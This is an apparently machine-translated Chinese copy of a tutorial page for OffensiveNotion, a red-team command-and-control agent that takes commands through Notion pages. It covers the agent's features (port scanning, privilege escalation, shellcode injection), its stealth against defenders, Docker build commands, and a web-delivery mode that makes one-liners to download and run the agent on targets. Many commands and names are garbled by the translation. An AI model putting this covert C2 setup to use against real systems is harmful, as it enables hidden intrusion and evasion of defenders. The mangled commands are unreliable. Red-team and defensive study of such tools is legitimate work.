# 进攻行动:作为进攻行动平台的概念

> 原文：<https://kalilinuxtutorials.com/offensivenotion/>

[![](img/78456edf1acc7f01cdbf84f36ef1a3f4.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8zSnksPwdiNd9bmOsWIDN_MZg6fcHxkTOgSAq6LfMn5dbEw9IhafuswJxguE5dJKK2f9o0fF8lG5ejap-m4Zd_igQthNIlymoSB9zBpHPStVZu9UQkveDTaXa8p_-n7Y9QpTKNSetrkAdFxpOPT9vRDt8uhxVE2pii6FipwF68cnGw9hpIKKTK9OF/s728/notion-beitragsbild.png)

**OffensiveNotion** 将后开发代理的功能与概念笔记应用的强大和舒适结合在一起。代理向您的概念页面发送数据，并从您的概念页面接收命令。当代理接收指令并通过概念开发者 API 发布结果时，你的 C2 流量就融入进来了。当你的蓝队寻找恶作剧的证据时，没有人会知道。

## 特征

*   基于概念笔记应用构建的全功能 C2 平台。
*   简单的设置:设置你的概念开发者 API 账户，将代理放到目标上，运行并享受！
*   Rust 中内置的跨平台代理可以使用相同的代码库为 Linux 和 Windows 编译。包括一个 Python 设置/控制器脚本来简化这个过程。
*   一系列功能，包括端口扫描、权限提升、异步命令执行、文件下载和外壳代码注入，所有这些都可以从一个概念页面轻松控制！
*   一边走一边记录！代理识别运行命令的特殊语法，因此可以随意使用概念页面的其余部分来记录您的操作。
*   通过设计实现协作！概念允许多人编辑和查看您的笔记。您的监听器页面可以处理多个代理，并且您可以邀请您的红队朋友访问您的页面。恭喜，这是一个团队服务器！
*   移动 C2！使用移动设备上的概念应用程序，从世界任何地方向您的代理发出命令。
*   隐身！C2 通信本身就超越了 API 的概念。你的 C2 流量看起来像是有人在为其预期目的使用概念。

快速启动

## TL；速度三角形定位法(dead reckoning)

我怎么才能让这东西工作起来，这样我就能知道它能做什么了？

1.  做一个概念账户
2.  转到概念 API 开发者页面并登录。创建一个集成用户(`**New integration**`)。复制该用户的 API 密钥。
3.  在你的概念书上写一页(任何一页都可以)。这是你的“听众”复制 URL 的最后一部分或在桌面应用程序中按 ctl+L。这是您的父页面 ID。暂时跟踪一下。用横幅和表情图标装饰你的页面。好好享受吧。
4.  在您的观点页面的右上角，单击“共享”和“邀请”将您的概念开发者 API 帐户添加到此页面。
5.  从发布部分下载 Linux 调试代理。
6.  在调试模式(`**-d**`)下运行发布代理，并输入每个提示的值。

**husky @ Ubuntu:~/Desktop/offensive notion/bin/Linux _ debug/debug $。/offensive _ opinion-d
[*]首发！正在获取配置选项！[* ]输入代理睡眠间隔> 5
[ *]输入代理抖动时间> 0 [* ]输入父页面 id>[…您的父页面 ID..]
[ *]输入 API 密钥>[…您的 API 密钥……][*]输入配置文件路径>
【留空】
[*]输入日志级别(1-4) >
2**

*   您的代理现在应该检查您的监听器页面:
*   运行命令！做一个待办块(观念 app 里的`**/todo**`，输入`**shell whoami 🎯**`，看魔术展开。

## 码头工人

使用您自己的定制配置来构建进攻代理的最佳方式是使用 Docker 和`**main.py**`脚本。这是整个操作的交钥匙点。

使用两个 Docker 命令，您可以构建编译代理的容器，在源代码中设置它的所有配置，编译它，并让它在您的物理主机上可用。然后，您可以再次运行命令，并根据需要更改配置。

## 构建和运行容器

这在 Linux 上效果最好。当然，你需要 Docker。一旦安装了 Docker，克隆 repo 并将 dir 更改为 repo。

### 码头工人建造

要构建容器:

**$ sudo 坞站映像构建-t 攻击概念。**

### 码头运行

使用以下 Docker 运行命令作为基础:

**$ sudo dock RM-f 攻击概念&&sudo dock container run-v $(pwd):/out–name 攻击概念-it 攻击概念-o linux -b 版本**

…其中:

*   **`sudo docker rm -f offensivenotion`** 删除容器的任何运行实例。
*   `**-v $(pwd):/out**`将主机上的攻击性回购映射到容器中的`**/out**`目录。TL；dr:编译完成后，你的代理会在那里。
*   `**-o linux -b release**`是构建脚本参数的集合。

`**-it offensivenotion**`之后的所有内容都是`**main.py**`脚本的参数。你说,`**main.py**`的剧本是什么？

### `main.py`

这个脚本是容器的入口点，处理创建一个攻击性通知代理所需的一切。它读入您想要创建的代理类型(Linux、Windows 或 macOS)，在源代码中设置配置，编译代理，并为您重置源代码。

它还可以做一些有趣的事情，如网络交付和 C2 检查。稍后将详细介绍这些内容。

查看`**main.py**`的完整用法，了解您的选择:

**python3 main.py -h
用法:main.py [-h] [-o {linux，windows，macos}] [-b {debug，release }][-c][-w]
[-m { powershell，wget-linux，wget-psh，python-linux，python-windows }][-IP HOSTIP][-p PORT]
offensive venotion 设置。必须以 root 用户身份运行。在容器中生成攻击代理。
可选参数:
-h，–help 显示此帮助信息并退出
-o {linux，windows，macos}，–OS { Linux，windows，macos}
目标 OS
-b {debug，release}，–build { debug，release}
二进制编译
-c，–C2 lint C2 林特尔。通过在您的监听器上创建一个测试页面来检查您的 C2 配置。
-w，–webdelivery 启动 web delivery 服务器来托管和交付您的代理。提供方便的衬管在
目标上运行。
-m {powershell，wget-linux，wget-psh，python-linux，python-windows}，–Method { powershell，wget-linux，wget-psh，python-linux，python-windows }
Web 交付方法
-ip HOSTip，–HOSTIP HOSTIP
Web 服务器主机 IP。
-p 端口，–PORT 端口 Web 服务器主机端口。**

唯一需要的两个参数是用于操作系统的`**-o**`和用于构建(调试或发布)的`**-b**`。其他参数包含在 Misc 部分。

如果没有传入 build 和 OS 参数，它默认为 Linux 调试代理。

脚本运行后，按照提示执行安装。您将输入 API 键和父页面 ID。关于这些的更多信息可以在下一节“设置”中找到。

最后，您将在回购的主目录中拥有一个代理。

### Docker Run 的更多示例

#### 我想构建一个用于测试的 Linux 调试代理:

**$ sudo dock RM-r 攻击概念&&sudo dock container run-v $(pwd):/out–name 攻击概念-it 攻击概念**

**我想做一个 Windows 发布代理:**

**$ sudo dock RM-r 攻击概念&&sudo dock container run-v $(pwd):/out–name 攻击概念-it 攻击概念-o windows -b 版本**

**我想试试大家都在谈论的那个很酷的 macOS 代理，发布版本:**

**$ sudo dock RM-r 攻击概念&&sudo dock container run-v $(pwd):/out–name 攻击概念-it 攻击概念-o macos -b 版本**

**我想构建一个 Linux 发布代理，并检查以确保我的 API 键和父页面是好的:**

**$ sudo dock RM-r 攻击概念&&sudo dock container run-v $(pwd):/out–name 攻击概念-it 攻击概念-o linux -b 版本–C2 lint**

#### 我想制作一个 Windows 版本的有效负载，并为 web 交付托管它

(野兽般的命令传来)

**$ sudo docker RM-f offensive notion&&sudo docker 容器 run-p 80:80-v $(pwd):/out-it–name offensive notion offensive notion-o windows-b release-w-IP 10 . 10 . 1 . 237–port 80-m powershell**

(我们来分解一下)

…其中:

*   `**sudo docker rm -f offensivenotion**`删除容器的任何运行实例。
*   `**sudo docker container run**`启动一个容器。
*   `**-p 80:80**`发布容器的端口，并转发给物理主机。确保这与该命令最后部分的`**--port**`参数相匹配。
*   `**-v $(pwd):/out**`将主机上的当前工作目录挂载为容器上的卷。您的`**config.json**`和有效负载被移到这里，这样它们最终会在您的物理主机上，以防您想要重用它们。
*   `**-it --name offensivenotion offensivenotion**`:把我放在容器中的一个交互终端(需要和`**main.py**`交互)，调用容器 offensivenotion，使用我们之前搭建的 offensivenotion 镜像。
*   `**-o windows -b release -w -ip 10.10.1.237 --port 80 -m powershell**`:这里所有的东西都是`**main.py**`的参数，你可以在 main.py 用法中找到(见上)。在这种情况下，创建一个 windows release 有效负载，打开 web 交付，将此 IP 地址和此端口用于下载支架，并使用 PowerShell 创建一行程序。

设置

## 设置您的概念开发者 API 帐户(完整说明)

概念 API 使用可以添加到页面的特殊 API 帐户。这创建了一个双向信任，只允许具有特定 API 密钥的特定 API 用户帐户访问特定页面。这里的 OPSEC 很棒！

首先，前往 https://developers.notion.com/，使用您的常规概念帐户登录。

接下来，点击右上角的“我的集成”:

## 设置监听程序页面(完整说明)

“倾听者”只是观念笔记本中的一页。但是您可以设置它来为您的代理捕捉回电:

创建您的侦听器页面。为想法添加新的一页，最好是在没有用于任何其他用途的笔记本中:

复制你的网页的网址。如果你在 web 浏览器概念客户端，这可以从页面的 URL 中获取。在桌面应用程序中，输入 ctl-l 将其复制到剪贴板。

如果您的监听器 URL 是:

https://www.notion.so/LISTENER-11223344556677889900112233445566

…那么您的父页面 ID 就是侦听器名称后面的数字。这种情况下就是`**11223344556677889900112233445566**`。这个值用于将您的代理连接到您的侦听器，所以请跟踪它！

您现在可以运行代理了！

从源代码构建

做运营代理最好的方法就是跟 Docker 和`**main.py**`。快速入门指南中介绍了这一过程。但是如果您更愿意从源代码构建代理，您也可以这样做。

如果您从源代码构建，我们建议使用 Linux 主机来构建代理以简化过程。

## 安装铁锈

在 Linux/macOS 上，您可以运行:

**$ curl–proto ' = https '–tlsv 1.2-SSF https://sh . rusup . RS | sh**

## 构建代理

下载 OffensiveNotion 存储库，转到`**agent/**`目录。

Cargo 使用所谓的“目标三元组”来指示编译到什么平台。要查看你已经安装了哪些，运行 **`rustup target list`。**

本机目标(Linux 上的 Linux、Windows 上的 Windows、macOS 上的 macOS)无需额外配置即可工作。我们将在后面的部分讨论交叉编译。

除了目标三元组，您还可以构建一个`**debug**`或`**release**`目标。`**debug**`适合测试，但是`**release**`应该是在约定期间部署的唯一版本。

### Linux

从`**agent**/`目录中，运行:

**$ cargo build[–release]**

…构建 Linux 调试或发布代理。

代理构建在`**target/**`子目录中。

### Windows(来自 Linux)

我们建议从 Linux 编译到 Windows，因为老实说，这样更好。此外，您可以更好地控制提交给 Defender 的样本。

安装 Windows 工具链:

**在 Linux 上构建 Windows 应用的 MingW 工具
apt install-y MingW-w64
rust up 工具链 install stable-x86 _ 64-PC-Windows-GNU**

…并构建代理:

**$ cargo build–目标 x86 _ 64-PC-windows-GNU[–release]**

代理构建在`**target/x86_64-pc-windows-gnu/**`子目录中。

### 苹果电脑

在 macOS 上进行原生构建相当简单。如上所述，请遵循以下步骤:

1.  按照 rustup.rs 上的说明安装 Rust
2.  克隆攻击性 GitHub 库。
3.  `**cd**`到`**agent**`目录。

现在，在运行`**cargo build**`之前，您需要确保 XCode 命令行工具已经安装。如果您之前已经设置了 XCode，那么您已经设置好了。否则，在终端中运行以下命令:

**xcode-选择-安装**

必要的工具(`**clang**`等)。)现在已经可以使用了。您现在可以运行`**cargo build --release**`。结果会在`**agent**`里面的`**target/release/**`目录中。

#### 从 Linux 交叉编译到 macOS。

事实上，从 Linux 交叉编译到 macOS 是可能的。这篇博文包含了这样做所必需的附加说明。几个问题:

*   确保`**linker**`和`**ar**`选项的附加配置在`**agent/.cargo/config**`中。目前，`**.cargo**`文件夹不存在。
*   如果您不想添加该文件夹/文件，您可以使用以下选项运行 cargo:
    *   `**CARGO_TARGET_x86_64_APPLE_DARWIN_LINKER=x86_64-apple-dawrin14-clang CARGO_TARGET_x86_64_APPLE_DARWIN_AR=x86_64_apple-darwin14-ar cargo build --release --target x86_64-apple-darwin**`
*   确保在克隆/构建 OSXCross 之后，将它的`**bin**`文件夹添加到你的`**$PATH**`的前面。

执行代理

编译后的代理可以用几个不同的参数运行。对于已编译的代理，没有帮助菜单，因此请参考以下内容了解其可能的参数:

### 没有争论

如果代理已经使用其参数的默认值进行了编译(即通过使用`**m**ain.py`进行设置)，代理在不带参数运行时将使用这些值。**这是处决特工最安全的方式。**参见快速入门指南和`**main.py**`了解更多信息。

如果代理没有使用缺省参数值进行编译，它将尝试在当前工作目录中定位`cfg.json`。如果该文件存在，它将使用这些参数运行。

如果在这种情况下没有可用的`**cfg.json**`文件，代理将退出而不建立连接。

### `**-d**`:调试模式。

允许您通过 CLI 输入每个代理参数。建议用于调试和测试。不建议用于手术。

示例:

**$。/offensive _ opinion-d
[*]首发！正在获取配置选项！[* ]输入代理睡眠间隔> 5
[ *]输入代理抖动时间>3*]输入父页面 id > […。父页面 ID…]
[ *]输入 API Key > […API key…] [* ]输入配置文件路径>
[*]输入日志级别(1-4)>
5
[+]Admin context:false
[+]Hostname:Ubuntu
[？]配置选项:ConfigOptions { sleep_interval: 5，jitter_time: 3，parent _ page _ ID:“[…父页面 ID…]”，API _ key:“[…API key…]”，config_file_path:“”，launch_app: false，log_level: 5 }
[+]创建页面…
[+] zzzZZZzzz: 5 秒**

### `-b` : Base64 编码配置

允许在执行时传递 base64 编码版本的配置选项。

示例:

**美元。/进攻 _ 概念-b eyjzgvlcf 9 pbnrlchbci 6 NSW amol 0 dgvyx 3 rpbuwuyusiomnbhcmvudf 9 wywdlx 2 lkijoiwy 4 uli 4 gcgfyzw 50 ihbhz 2 adiiwxbpx 2 tlsi 6 ilsuli 4 UC 2 vjcmv 0 igtles 4 null 0 ilcjjjb 25 mawdfzmlz 9 wyxriojoiy 2 zlmpzb 24 ilcjsyxvuy 2 hfyy
[+]管理上下文:false
[+]主机名:ubuntu
[？]配置选项:配置选项{ sleep_interval: 5，jitter_time: 3，parent _ page _ id:"[…]parent page id…]，API _ key:"[…. API key…]"，config_file_path:" "，launch_app: false，log _ level:5]t5 "[+]creating page…
zzzzzzzzzz:T7]5 秒**

### `-c`:配置文件

将配置文件路径传递给代理以获取配置。

示例:

**$ cat CFG . JSON
{ " sleep _ interval ":5，" jitter_time":3，" parent _ page _ ID ":"[…parent page ID…]"" APi _ key ":"[…APi key…]"" config _ file _ path ":" CFG . JSON "，" launch_app":false，" log_level":5}
$。/offensive _ incidence-c CFG . JSON
[*]首发！
Object({ " API _ key ":String([…。API 密钥…..])"、" config _ file _ path ":String(" CFG . JSON ")、" jitter_time": Number(3)、" launch_app": Bool(false)、" log_level": Number(5)、" parent _ page _ ID ":String("[…parent page ID…]")、" sleep _ interval ":Number(5)})
[+]Admin context:false
[+]Hostname:Ubuntu
[？]配置选项:ConfigOptions { sleep_interval: 5，jitter_time: 3，parent _ page _ ID:“[…父页面 ID…]”，API _ key:“[…API key…]"，config_file_path: "cfg.json "，launch_app: false，log_level: 5 }
[+]创建页面…
[+] zzzZZZzzz: 5 秒**

[Download](https://github.com/mttaggart/OffensiveNotion)